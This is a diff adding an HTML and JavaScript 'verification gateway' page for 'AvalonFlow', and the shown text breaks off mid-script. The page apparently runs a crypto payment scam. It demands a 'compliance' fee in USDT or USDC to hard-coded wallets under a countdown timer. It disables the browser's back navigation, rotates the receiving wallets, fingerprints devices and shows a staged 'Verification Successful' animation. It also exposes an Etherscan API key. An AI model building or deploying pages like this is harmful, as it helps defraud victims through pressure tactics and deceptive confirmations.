@@ -1,0 +1,1200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Custom Verification Gateway</title>
+
+    <!-- Favicon -->
+    <link rel="icon" href="/favicon.png" type="image/png" sizes="48x48">
+
+    <!-- Structured Data for Logo -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "AvalonFlow",
+      "url": "https://avalonflow.site",
+      "logo": "https://avalonFlow.site/favicon.png"
+    }
+    </script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+    <style>
+        /* ---------- Base ---------- */
+        body {
+        font-family: 'Georgia', sans-serif; 
+margin: 0;
+color: #fff;
+background: linear-gradient(135deg,#0d0f1a,#050608);
+overflow-x:hidden;
+}
+        button { cursor: pointer; }
+        a { color: inherit; text-decoration: none; font-weight: bold; }
+
+                /* ---------- Floating Background ---------- */
+#floating-bg {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    pointer-events: none;
+
+    /* Soft white/blue futuristic background */
+    background: radial-gradient(circle at bottom, #cfe8ff, #ffffff);
+
+    overflow: hidden;
+}
+
+.particle {
+    position: absolute;
+    border-radius: 50%;
+    opacity: 0.6;
+
+    animation: floatParticles linear infinite;
+
+    /* Soft futuristic glow */
+    background: rgba(120, 180, 255, 0.7);
+    box-shadow: 0 0 10px #8ec5ff, 0 0 20px #b7dcff;
+}
+
+@keyframes floatParticles {
+    0% {
+        transform: translateY(100vh) scale(0.3);
+        opacity: 0;
+    }
+
+    50% {
+        opacity: 1;
+    }
+
+    100% {
+        transform: translateY(-10vh) scale(1);
+        opacity: 0;
+    }
+}
+
+        /* ---------- Content ---------- */
+#content {
+    position: relative;
+    z-index: 1;
+    padding: 20px 15px;       /* smaller padding for mobile */
+    max-width: 600px;
+    margin: auto;
+    padding-bottom: 40px;
+    text-align: center;
+}
+
+/* --- Container Glass Panel --- */
+#payment-container {
+    background: rgba(120, 180, 255, 0.7);
+    backdrop-filter: blur(15px);
+    border-radius: 20px;
+    padding: 25px 20px;       /* smaller padding for mobile */
+    box-shadow: 0 0 20px rgba(0,255,255,0.2), 0 0 40px rgba(255,0,255,0.1);
+    text-align: center;
+    max-width: 350px;          /* narrower to show edges on mobile */
+    width: 95%;                /* almost full width on small screens */
+    animation: pulseGlow 3s infinite alternate;
+
+/* ADD margin bottom for scrolling */
+    margin-bottom: 50px;
+}
+
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 20px rgba(0,255,255,0.2), 0 0 40px rgba(255,0,255,0.1); }
+            50% { box-shadow: 0 0 30px rgba(0,255,255,0.4), 0 0 60px rgba(255,0,255,0.2); }
+            100% { box-shadow: 0 0 25px rgba(0,255,255,0.3), 0 0 50px rgba(255,0,255,0.15); }
+        }
+
+        /* --- Headings & Status --- */
+        #status {
+            font-size: 1.8rem;
+            margin-bottom: 29px;
+            color: #0ff;
+            text-shadow: 0 0 8px #0ff, 0 0 12px #0ff;
+            transition: all 0.3s ease-in-out;
+        }
+
+        .amount {
+            font-weight: bold;
+            font-size: 1.6rem;
+            color: #ff3fff;
+            text-shadow: 0 0 10px #ff3fff, 0 0 20px #ff3fff;
+        }
+
+        p {
+            margin: 12px 0;
+            font-size: 1.2rem;
+            letter-spacing: 0.5px;
+        }
+
+        p + p {
+            font-family: 'Courier New', monospace;
+            font-size: clamp(1.6rem, 4vw, 1.8rem);
+            color: #0ff;
+            text-shadow: 0 0 6px #0ff;
+            word-break:  break-all;
+  overflow-wrap: normal !important;
+        }
+
+        #check-btn {
+            margin-top: 25px;
+            padding: 12px 25px;
+            font-size: 1rem;
+            font-weight: bold;
+            color: #fff;
+            background: linear-gradient(45deg, #0ff, #ff3fff);
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 0 8px #0ff, 0 0 16px #ff3fff;
+            transition: all 0.3s ease-in-out;
+        }
+
+        #check-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 12px #0ff, 0 0 24px #ff3fff;
+        }
+
+        /* Timer Styling */
+        #timer {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1rem;
+            font-weight: bold;
+            color: #ff3fff;
+            text-shadow: 0 0 5px #ff3fff, 0 0 10px #ff3fff, 0 0 20px #ff3fff, 0 0 40px #ff3fff;
+            margin-top: 15px;
+            text-align: center;
+            animation: glowPulse 2s infinite alternate;
+        }
+
+        @keyframes glowPulse {
+            0% { text-shadow: 0 0 5px #ff3fff, 0 0 10px #ff3fff, 0 0 20px #ff3fff, 0 0 40px #ff3fff; }
+            50% { text-shadow: 0 0 10px #ff3fff, 0 0 20px #ff3fff, 0 0 40px #ff3fff, 0 0 60px #ff3fff; }
+            100% { text-shadow: 0 0 8px #ff3fff, 0 0 16px #ff3fff, 0 0 32px #ff3fff, 0 0 50px #ff3fff; }
+        }
+
+/* ================= Header Logo Card Neon ================= */
+header .logo-card {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 90%;
+  max-width: 300px;
+  height: 180px;
+  border-radius: 24px;
+
+  /* Purple glass */
+  background: rgba(107,44,216,0.2);
+  backdrop-filter: blur(15px);
+  border: 1px solid rgba(107,44,216,0.4);
+
+  /* Outer neon glow */
+  box-shadow: 
+    0 0 10px rgba(107,44,216,0.5),
+    0 0 20px rgba(107,44,216,0.4),
+    0 0 40px rgba(107,44,216,0.3),
+    0 0 80px rgba(107,44,216,0.2);
+  position: relative;
+  margin: 0 auto;
+
+  /* Smooth pulsing */
+  animation: neonGlow 2.5s ease-in-out infinite alternate;
+  transition: box-shadow 0.3s ease;
+  overflow: hidden;
+}
+
+/* Inner border glow */
+header .logo-card::before {
+  content: '';
+  position: absolute;
+  inset: 2px; /* slightly smaller than card edges */
+  border-radius: 22px;
+  border: 2px solid rgba(107,44,216,0.6);
+  box-shadow:
+    0 0 10px rgba(107,44,216,0.8),
+    0 0 20px rgba(107,44,216,0.6),
+    0 0 30px rgba(107,44,216,0.4);
+  pointer-events: none;
+  z-index: 1;
+  animation: innerGlow 2.5s ease-in-out infinite alternate;
+}
+
+/* Animated halo behind logo */
+header .logo-card::after {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 120%;
+  height: 120%;
+  background: radial-gradient(circle, rgba(107,44,216,0.4) 0%, transparent 70%);
+  transform: translate(-50%, -50%) scale(1);
+  border-radius: 50%;
+  z-index: 0; /* behind logo image */
+  animation: haloPulse 2.5s ease-in-out infinite alternate;
+  pointer-events: none;
+}
+
+/* Image inside card stays on top */
+header .logo-card img {
+  max-width: 90%;
+  max-height: 90%;
+  height: auto;
+  z-index: 2;
+  position: relative;
+}
+
+/* Outer glow pulse animation */
+@keyframes neonGlow {
+  0% {
+    box-shadow: 
+      0 0 15px rgba(107,44,216,0.4),
+      0 0 30px rgba(107,44,216,0.3),
+      0 0 50px rgba(107,44,216,0.2),
+      0 0 100px rgba(107,44,216,0.15);
+  }
+  50% {
+    box-shadow: 
+      0 0 25px rgba(107,44,216,0.8),
+      0 0 50px rgba(107,44,216,0.6),
+      0 0 80px rgba(107,44,216,0.4),
+      0 0 120px rgba(107,44,216,0.25);
+  }
+  100% {
+    box-shadow: 
+      0 0 15px rgba(107,44,216,0.4),
+      0 0 30px rgba(107,44,216,0.3),
+      0 0 50px rgba(107,44,216,0.2),
+      0 0 100px rgba(107,44,216,0.15);
+  }
+}
+
+/* Inner border glow pulse animation */
+@keyframes innerGlow {
+  0% {
+    box-shadow:
+      0 0 5px rgba(107,44,216,0.5),
+      0 0 10px rgba(107,44,216,0.4),
+      0 0 15px rgba(107,44,216,0.3);
+  }
+  50% {
+    box-shadow:
+      0 0 15px rgba(107,44,216,0.8),
+      0 0 25px rgba(107,44,216,0.6),
+      0 0 35px rgba(107,44,216,0.4);
+  }
+  100% {
+    box-shadow:
+      0 0 5px rgba(107,44,216,0.5),
+      0 0 10px rgba(107,44,216,0.4),
+      0 0 15px rgba(107,44,216,0.3);
+  }
+}
+
+/* Halo pulse animation behind logo */
+@keyframes haloPulse {
+  0% {
+    transform: translate(-50%, -50%) scale(1);
+    opacity: 0.5;
+  }
+  50% {
+    transform: translate(-50%, -50%) scale(1.15);
+    opacity: 0.7;
+  }
+  100% {
+    transform: translate(-50%, -50%) scale(1);
+    opacity: 0.5;
+  }
+}
+
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            height: 18px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 18px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            border-radius: 12px;
+            position: relative;
+            transition: width 0.6s ease;
+            background: linear-gradient(90deg,#4facfe,#00f2fe);
+            box-shadow: 0 0 20px rgba(79,172,254,0.6);
+        }
+
+        .progress-fill::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: energyFlow 2.5s linear infinite;
+        }
+
+        @keyframes energyFlow {
+    0% { transform: translateX(100%); }
+    100% { transform: translateX(-100%); }
+}
+
+                .plan-pay {
+    display: flex;
+    align-items: center;      /* vertically center logo & text */
+    justify-content: center;  /* horizontal center */
+    gap: 8px;                 /* spacing between logo and text */
+    flex-wrap: wrap;          /* wrap if screen too small */
+}
+
+.plan-logo {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    margin: 0;                /* remove previous margin */
+}
+
+.token-name, .network {
+    display: inline-block;
+    font-weight: bold;
+    color: #fff;
+}
+
+.plan-pay a:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 18px rgba(155, 89, 182, 0.7);
+}
+
+#tokenSelector {
+    display: flex;
+    justify-content: center;
+    gap: 15px; /* space between buttons */
+    margin-bottom: 20px;
+}
+
+#tokenSelector button {
+    padding: 12px 25px;
+    font-size: 1rem;
+    font-weight: bold;
+    color: #fff;
+    background: linear-gradient(135deg, #0ff, #ff3fff);
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    text-transform: uppercase;
+    box-shadow: 0 0 10px #0ff, 0 0 20px #ff3fff;
+    transition: all 0.3s ease-in-out;
+    position: relative;
+    overflow: hidden;
+}
+
+#tokenSelector button::before {
+    content: "";
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: linear-gradient(45deg, rgba(0,255,255,0.2), rgba(255,0,255,0.2), rgba(0,255,255,0.2));
+    transform: rotate(45deg);
+    opacity: 0;
+    transition: opacity 0.3s ease-in-out;
+}
+
+#tokenSelector button:hover::before {
+    opacity: 1;
+}
+
+#tokenSelector button:hover {
+    transform: scale(1.1);
+    box-shadow: 0 0 15px #0ff, 0 0 30px #ff3fff, 0 0 50px #0ff;
+}
+
+.copy-btn {
+    margin-left: 8px;
+    padding: 2px 6px;
+    font-size: 0.8rem;
+    border: none;
+    border-radius: 4px;
+    background: linear-gradient(45deg, #0ff, #ff3fff);
+    color: #fff;
+    cursor: pointer;
+    transition: 0.2s;
+}
+
+.copy-btn:hover {
+    transform: scale(1.1);
+    box-shadow: 0 0 6px #0ff, 0 0 12px #ff3fff;
+}
+
+            footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    text-align: center;
+    padding: 18px 0;
+    font-size: 14px;
+    color: #555;
+    background: rgba(255, 255, 255, 0.92);
+    backdrop-filter: blur(12px);
+    box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.08);
+    z-index: 6;
+}
+
+        .qr-section div {
+            margin: 0 auto;
+            border-radius: 12px;
+        }
+
+        .token-card.inactive {
+            display: none;
+        }
+
+@media (max-width: 400px) {
+    #payment-container {
+        padding: 20px 15px;
+        max-width: 300px;
+    }
+    .amount {
+        font-size: 1.4rem;
+    }
+    p {
+        font-size: 0.9rem;
+    }
+    #status {
+        font-size: 1.4rem;
+    }
+
+        /* ---------- Notification Bar ---------- */
+        .notification-bar {
+            position: fixed;
+            top: -80px;
+            right: 20px;
+            background: rgba(30, 144, 255, 0.25);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(30,144,255,0.4);
+            color: #fff;
+            padding: 12px 18px;
+            border-radius: 12px;
+            font-size: 14px;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+            transition: top 0.5s ease, opacity 0.5s ease;
+            z-index: 9999;
+            opacity: 0;
+            max-width: 350px;
+            white-space: normal;
+            overflow: hidden;
+        }
+
+        .notification-bar.show { top: 20px; opacity: 1; }
+
+        .notification-bar::before {
+            content: '';
+            position: absolute;
+            left: -50%;
+            top: 0;
+            width: 50%;
+            height: 100%;
+            background: rgba(255,255,255,0.3);
+            transform: skewX(-25deg);
+            animation: liquidWave 2s linear infinite;
+        }
+
+        @keyframes liquidWave { 0% { left: -50%; } 100% { left: 100%; } }
+
+.payment-description{
+    margin-bottom:18px;
+    text-align:center;
+}
+
+.payment-title{
+    font-size:14px;
+    opacity:0.8;
+    margin:0;
+color:#ccc;
+font-weight: bold;
+}
+
+.payment-plan{
+    font-size:18px;
+    font-weight:600;
+    margin-top:4px;
+color:#E11D48;
+text-shadow: 0 0 8px rgba(225, 29, 72, 0.3);
+}
+
+.walletconnect-actions{
+    margin-top:20px;
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+}
+
+.wallet-btn{
+    width:100%;
+    padding:14px 18px;
+    border:none;
+    border-radius:14px;
+    font-size:15px;
+    font-weight:700;
+    color:#fff;
+    background:linear-gradient(135deg,#6b2cd8,#9b59b6);
+    box-shadow:
+      0 0 12px rgba(107,44,216,0.5),
+      0 0 24px rgba(155,89,182,0.3);
+    transition:all .25s ease;
+}
+
+.wallet-btn:hover{
+    transform:translateY(-2px);
+    box-shadow:
+      0 0 18px rgba(107,44,216,0.7),
+      0 0 36px rgba(155,89,182,0.45);
+}
+
+    /* Token Selector Mobile Adjustment */
+    #tokenSelector {
+        flex-direction: column;
+        gap: 10px; /* smaller spacing vertically */
+    }
+    #tokenSelector button {
+        width: 100%; /* full width for mobile */
+        padding: 10px 0;
+        font-size: 0.9rem;
+    }
+}
+    </style>
+</head>
+
+<body>
+
+  <div id="floating-bg"></div>
+
+  <div id="content">
+
+    <header style="text-align:center; padding:40px 0;">
+  <div class="logo-card">
+    <img src="assets/pictures/1775740874549.jpg" alt="AvalonFlow Logo">
+  </div>
+</header>
+
+    <!-- Notification Bar -->
+    <div id="planNotification" class="notification-bar"></div>
+
+<div class="payment-description">
+    <p class="payment-title">You are authorizing Bond Protection Value Compliance</p>
+    <p class="payment-plan">🪽AvalonCare Custom</p> 
+</div>
+
+    <!-- Token Selector -->
+    <div id="tokenSelector" style="margin-bottom:20px;">
+      <button onclick="showTokenCard('usdt')">USDT NETWORK</button>
+      <button onclick="showTokenCard('usdc')">USDC NETWORK</button>
+    </div>
+
+    <!-- Payment Container -->
+    <div id="payment-container">
+
+      <!-- USDT Card -->
+      <div class="token-card" id="usdt-card">
+        <div class="plan-pay">
+          <img class="plan-logo"
+               src="https://assets.coingecko.com/coins/images/325/large/Tether.png"
+               alt="AvalonCare Custom Logo">
+          <span class="token-name">USDT</span>
+          <span class="network">ERC-20</span>
+        </div>
+
+        <div class="amount-section">
+          <p>Authorize exactly:</p>
+          <p class="amount" id="usdt-amount">119.2037</p>
+        </div>
+
+        <<div class="wallet-section">
+  <p>Wallet Address:</p>
+  <p class="wallet" id="usdt-wallet">0x63d93f4348b109492d75aaaf10ac374d448178cd
+    <button class="copy-btn" onclick="copyWallet('usdt-wallet')">Copy</button>
+  </p>
+</div>
+
+
+        <div class="qr-section">
+          <div id="usdt-qr"></div>
+        </div>
+
+<<<div class="walletconnect-actions">
+
+  <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handlePayClick()">
+    Authorize Compliance 
+  </button>
+
+</div>
+        <p id="usdt-timer">Verification expires in 05:00</p>
+
+        <div class="progress-bar">
+          <div class="progress-fill" id="usdt-progress"></div>
+          <div class="status" id="usdt-status">Waiting for verification...</div>
+        </div>
+      </div>
+
+      <!-- USDC Card -->
+      <div class="token-card inactive" id="usdc-card">
+        <div class="plan-pay">
+          <img class="plan-logo"
+               src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png"
+               alt="AvalonCare Custom Logo">
+          <span class="token-name">USDC</span>
+          <span class="network">ERC-20</span>
+        </div>
+
+        <div class="amount-section">
+          <p>Authorize exactly:</p>
+          <p class="amount" id="usdc-amount">119.2037</p>
+        </div>
+
+        <<div class="wallet-section">
+  <p>Wallet Address:</p>
+  <p class="wallet" id="usdc-wallet">0x63d93f4348b109492d75aaaf10ac374d448178cd
+    <button class="copy-btn" onclick="copyWallet('usdt-wallet')">Copy</button>
+  </p>
+</div>
+
+
+        <div class="qr-section">
+          <div id="usdc-qr"></div>
+        </div>
+
+<<<div class="walletconnect-actions">
+
+  <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handlePayClick()">
+    Authorize Compliance 
+  </button>
+
+</div>
+        <p id="usdc-timer">Verification expires in 05:00</p>
+
+        <div class="progress-bar">
+          <div class="progress-fill" id="usdc-progress"></div>
+          <div class="status" id="usdc-status">Waiting for verification...</div>
+        </div>
+      </div>
+
+    </div>
+
+<footer>
+  © 2026 Powered by AvalonFlow Corp
+  </footer>
+
+</body>
+<script>
+  // Prevent user from going back to previous pages
+  history.pushState(null, null, location.href);
+
+  window.addEventListener('popstate', function () {
+    history.go(1); // keeps user on this page
+  });
+
+  // Optional: also prevent back with keyboard shortcuts
+  window.addEventListener('keydown', function (e) {
+    if ((e.key === 'Backspace' && e.target === document.body) || e.key === 'ArrowLeft') {
+      e.preventDefault();
+    }
+  });
+
+// ================================
+// 🔐 PAYMENT MODE (HYBRID ROUTER)
+// ================================
+let paymentMode = "manual";
+let timerInterval;
+
+// "manual" | "paymento"
+
+// ---------------- TIMER / SESSION INITIALIZATION ----------------
+const totalDuration = 15 * 60 * 1000; // 15 minutes
+
+let startTime = localStorage.getItem("avalonflowStartTime");
+if (startTime) {
+    const elapsed = Date.now() - parseInt(startTime, 10);
+    if (elapsed > totalDuration) {
+        // Clear expired session
+        localStorage.removeItem("avalonflowAmount");
+        localStorage.removeItem("avalonflowStartTime");
+        localStorage.removeItem("avalonflowWallet"); // also clear old wallet
+        startTime = null; // force a new session
+    } else {
+        startTime = parseInt(startTime, 10); // convert to number
+    }
+}
+
+if (!startTime) {
+    startTime = Date.now();
+    localStorage.setItem("avalonflowStartTime", startTime);
+}
+
+// ---------------- FLOATING PARTICLES ----------------
+const bg = document.getElementById('floating-bg');
+const colors = ['#6b2cd8', '#9b59b6', '#8e44ad'];
+
+function particle() {
+    const p = document.createElement('div');
+    p.className = 'particle';
+    const s = Math.random() * 20 + 10;
+    p.style.width = s + 'px';
+    p.style.height = s + 'px';
+    p.style.left = Math.random() * 100 + 'vw';
+    p.style.background = `radial-gradient(circle, ${colors[Math.floor(Math.random()*3)]}, transparent)`;
+    p.style.animationDuration = (Math.random()*20 + 10) + 's';
+    bg.appendChild(p);
+    setTimeout(() => p.remove(), 30000);
+}
+setInterval(particle, 800);
+
+// ---------------- PAYMENTO ENGINE ----------------
+async function handlePayClick() {
+
+    try {
+        // prevent spam clicks
+        if (paymentMode === "paymento") return;
+
+        paymentMode = "paymento";
+
+        triggerNotification("Redirecting to connection portal...", 2000);
+
+        // stop manual polling if running
+        if (typeof pollTimeout !== "undefined") {
+            clearTimeout(pollTimeout);
+        }
+
+        // optional safety: mark session as transitioning
+        paymentDone = true;
+
+        // redirect
+        setTimeout(() => {
+            window.location.href =
+                "https://link.avalonflow.site/crawithholding";
+        }, 800);
+
+    } catch (err) {
+        console.error(err);
+        triggerNotification("Authorization connection error", 3000);
+    }
+}
+
+// ---------------- COPY WALLET ----------------
+function copyWallet(id) {
+    paymentMode = "manual";
+
+    const walletP = document.getElementById(id);
+    const walletText = Array.from(walletP.childNodes)
+        .filter(node => node.nodeType === Node.TEXT_NODE)
+        .map(node => node.textContent.trim())
+        .join('');
+
+    navigator.clipboard.writeText(walletText)
+        .then(() => {
+            triggerNotification("Wallet Address Copied", 3000);
+            startManualIfAllowed();
+        })
+        .catch(() => {
+            triggerNotification("Failed to copy Wallet Address", 3000);
+        });
+}
+
+// ---------------- WALLET & TOKENS ----------------
+const wallets = [
+    "0x63d93f4348b109492d75aaaf10ac374d448178cd",
+    "0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B"
+];
+
+const apiKey = "R53TCHYDZ9W1GJ4N861427HN52APJ5DZNI";
+
+const tokens = {
+    USDT:"0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    USDC:"0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
+};
+
+// ---------------- ASSIGN WALLET PAIR PER SESSION ----------------
+let walletPair = JSON.parse(localStorage.getItem("avalonflowWalletPair"));
+if(!walletPair){
+    walletPair = { USDT: wallets[0], USDC: wallets[1] };
+    localStorage.setItem("avalonflowWalletPair", JSON.stringify(walletPair));
+}
+
+// ---------------- ACTIVE WALLET PER SESSION ----------------
+let activeWallet = localStorage.getItem("avalonflowWallet");
+if (!activeWallet) {
+    activeWallet = wallets[Math.floor(Math.random() * wallets.length)];
+    localStorage.setItem("avalonflowWallet", activeWallet);
+}
+
+// ---------------- TOKEN SWITCH ----------------
+let activeToken = "USDT";
+function showTokenCard(selectedToken){
+    activeToken = selectedToken.toUpperCase();
+    const cards = document.querySelectorAll(".token-card");
+    cards.forEach(card => card.classList.add("inactive"));
+    const activeCard = document.getElementById(`${selectedToken}-card`);
+    if(activeCard) activeCard.classList.remove("inactive");
+
+    // Show correct wallet per token
+    if(selectedToken === "usdt") document.getElementById("usdt-wallet").childNodes[0].nodeValue = walletPair.USDT;
+    if(selectedToken === "usdc") document.getElementById("usdc-wallet").childNodes[0].nodeValue = walletPair.USDC;
+}
+showTokenCard("usdt");
+
+
+// ---------------- CUSTOM AMOUNT FROM PLAN ----------------
+const storageKey = "avalonflowAmount_custom"; // custom plan key
+let customAmount = localStorage.getItem("avalonflowCustomAmount");
+
+if (!customAmount) {
+    // fallback (if user somehow skips plan page)
+    customAmount = "2133.33";
+}
+
+// add unique decimal for tracking
+const randomDecimal = Math.floor(Math.random() * 10000) / 10000;
+let expectedAmount = (parseFloat(customAmount) + randomDecimal).toFixed(4);
+
+// store for session tracking
+localStorage.setItem("avalonflowAmount", expectedAmount);
+document.getElementById("usdt-amount").innerText = "$" + expectedAmount;
+document.getElementById("usdc-amount").innerText = "$" + expectedAmount;
+
+// ---------------- QR CODES ----------------
+const tokenValue = Math.floor(parseFloat(expectedAmount) * 1e6);
+    // Clear existing QR codes
+    document.getElementById("usdt-qr").innerHTML = "";
+    document.getElementById("usdc-qr").innerHTML = "";
+
+    // Regenerate QR codes with new wallet addresses
+    new QRCode(document.getElementById("usdt-qr"), {
+        text: `ethereum:${walletPair.USDT}?value=${tokenValue}`,
+        width: 120, height: 120,
+        colorDark: "#0ff",
+        colorLight: "rgba(0,0,0,0)",
+        correctLevel: QRCode.CorrectLevel.H
+    });
+    new QRCode(document.getElementById("usdc-qr"), {
+        text: `ethereum:${walletPair.USDC}?value=${tokenValue}`,
+        width: 120, height: 120,
+        colorDark: "#ff3fff",
+        colorLight: "rgba(0,0,0,0)",
+        correctLevel: QRCode.CorrectLevel.H
+    });
+
+// Display the wallet text for copy
+document.getElementById("usdt-wallet").childNodes[0].textContent = walletPair.USDT;
+document.getElementById("usdc-wallet").childNodes[0].textContent = walletPair.USDC;
+
+// ---------------- FLAG TO PREVENT DOUBLE REDIRECTS ----------------
+let paymentDone = false;
+
+function animatePaymentLine(){
+    if(paymentDone) return;
+    paymentDone = true;
+
+    const usdtStatus = document.getElementById("usdt-status");
+    const usdcStatus = document.getElementById("usdc-status");
+
+    if(usdtStatus) usdtStatus.innerText = "Blockchain confirmation detected...";
+    if(usdcStatus) usdcStatus.innerText = "Blockchain confirmation detected...";
+
+    setTimeout(()=>{
+        let progress = 0;
+        const anim = setInterval(()=>{
+            progress++;
+            const bar = "▬".repeat(progress);
+            if(usdtStatus) usdtStatus.innerText = `Sent ${bar}`;
+            if(usdcStatus) usdcStatus.innerText = `Sent ${bar}`;
+            if(progress >= 18){
+                clearInterval(anim);
+                if(usdtStatus) usdtStatus.innerText = "Sent __________ Received ✔️";
+                if(usdcStatus) usdcStatus.innerText = "Sent __________ Received ✔️";
+                triggerNotification("Verification Successful. Redirecting...");
+            }
+        }, 60);
+    }, 800);
+}
+
+// ---------------- UPDATE TIMER ----------------
+window.addEventListener("DOMContentLoaded", () => {
+    const usdtProgress = document.getElementById("usdt-progress");
+    const usdcProgress = document.getElementById("usdc-progress");
+    const usdtTimer = document.getElementById("usdt-timer");
+    const usdcTimer = document.getElementById("usdc-timer");
+    const usdtStatus = document.getElementById("usdt-status");
+    const usdcStatus = document.getElementById("usdc-status");
+    const checkBtn = document.getElementById("check-btn");
+
+    // ---------------- TIMER FUNCTION ----------------
+    function updateTimer() {
+        const now = Date.now();
+        const elapsed = now - startTime;
+        const remaining = totalDuration - elapsed;
+
+        const percentage = Math.max(0, (remaining / totalDuration) * 100);
+        usdtProgress.style.width = percentage + "%";
+        usdcProgress.style.width = percentage + "%";
+
+        const minutes = String(Math.floor(remaining / 60000)).padStart(2, "0");
+        const seconds = String(Math.floor((remaining % 60000) / 1000)).padStart(2, "0");
+
+        usdtTimer.innerText = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification session expired!";
+        usdcTimer.innerText = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification session expired!";
+
+        if (remaining <= 0 && !paymentDone) {
+            paymentDone = true;
+
+            // Swap wallets on expiry
+            const temp = walletPair.USDT;
+            walletPair.USDT = walletPair.USDC;
+            walletPair.USDC = temp;
+            localStorage.setItem("avalonflowWalletPair", JSON.stringify(walletPair));
+
+            // Update wallet display immediately
+            document.getElementById("usdt-wallet").childNodes[0].nodeValue = walletPair.USDT;
+            document.getElementById("usdc-wallet").childNodes[0].nodeValue = walletPair.USDC;
+
+            // Update status and progress
+            usdtStatus.innerText = "Verification session expired.";
+            usdcStatus.innerText = "Verification session expired.";
+            usdtProgress.style.width = "0%";
+            usdcProgress.style.width = "0%";
+
+            if (checkBtn) checkBtn.disabled = true;
+
+            // Clear session data
+            localStorage.removeItem("avalonflowAmount");
+            localStorage.removeItem("avalonflowStartTime");
+          
+                localStorage.removeItem(storageKey);
+  localStorage.removeItem("avalonflowWallet");
+
+// ADD THIS
+localStorage.removeItem("avalonflowCustomAmount");
+
+            clearInterval(timerInterval);
+            if (typeof pollTimeout !== "undefined") clearTimeout(pollTimeout);
+
+            try { triggerNotification("Verification Failed. Redirecting...", 3000); } catch(err){}
+
+            setTimeout(() => {
+                window.location.href = "https://membership-signup.avalonflow.site/sign-in";
+            }, 3200);
+        }
+    }
+
+     timerInterval = setInterval(updateTimer, 1000);
+    updateTimer(); // initial call
+});
+
+// ---------------- BLOCKCHAIN PAYMENT DETECTION ----------------
+const pageLoadTime = Math.floor(Date.now()/1000);
+
+async function checkPayment() {
+    if (Date.now() - startTime > totalDuration) return true;
+
+    const token = activeToken;
+    const contract = tokens[token];
+    const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${activeWallet}&contractaddress=${contract}&sort=desc&apikey=${apiKey}`;
+
+    try {
+        const res = await fetch(url);
+        const data = await res.json();
+        if (data.status !== "1") return false;
+
+        for (let tx of data.result) {
+            const amount = +(tx.value / 1e6).toFixed(4);
+            const expected = +expectedAmount;
+            const txTime = parseInt(tx.timeStamp || 0, 10);
+            const confirmations = parseInt(tx.confirmations || 1, 10);
+
+            if (
+                tx.to.toLowerCase() === activeWallet.toLowerCase() &&
+                amount === expected &&
+                txTime > pageLoadTime &&
+                confirmations >= 1 &&
+                !paymentDone
+            ) {
+               
+                animatePaymentLine();
+
+                localStorage.removeItem(storageKey);
+                localStorage.removeItem("avalonflowStartTime");
+                localStorage.removeItem("avalonflowWallet");
+
+                clearInterval(timerInterval);
+                clearTimeout(pollTimeout);
+
+                // 🔥 TRIGGER SECURE PAYLOAD FLOW (instead of direct redirect)
+                await handleSecureRedirect(tx.hash);
+
+                return true;
+            }
+        }
+    } catch (err) {
+        console.error("Payment check error:", err);
+    }
+
+    return false;
+}
+
+
+// ================================
+// 🔐 LAYER 1: DEVICE ID
+// ================================
+const deviceId =
+    localStorage.getItem("deviceId") ||
+    (crypto.randomUUID
+        ? crypto.randomUUID()
+        : String(Date.now()) + Math.random());
+
+localStorage.setItem("deviceId", deviceId);
+
+
+// ================================
+// 🔐 LAYER 2: NONCE
+// ================================
+const nonce =
+    crypto.randomUUID
+        ? crypto.randomUUID()
+        : String(Date.now()) + Math.random();
+
+
+// ================================
+// 🔐 LAYER 3: FINGERPRINT
+// ================================
+function getFingerprint() {
+    return btoa(
+        navigator.userAgent +
+        navigator.language +
+        screen.width +
+        screen.height +
+        Intl.DateTimeFormat().resolvedOptions().timeZone
+    );
+}
+
+
+// ================================
+// 🔐 LAYER 4: SECRET ROTATION
+// ================================
+const secrets = [
+    "AvalonFlow rules 2026",
+    "God Grace",
+    "Flow is power",
+    "Alpha cycle 9"
+];
+
+function getSecret() {
+    const hour = Math.floor(Date.now() / 3600000);
+    return secrets[hour % secrets.length];
+}
+
+
+// ================================
+// 🔐 SIGNATURE ENGINE
+// ================================
+async function sign(data) {
+    const secret = getSecret();
+    const msg = new TextEncoder().encode(data + secret);
+    const hashBuffer = await crypto.subtle.digest("SHA-256", msg);
+
+    return Array.from(new Uint8Array(hashBuffer))
+        .map(b => b.toString(16).padStart(2, "0"))
+        .join("");
+}
+
+
+// ================================
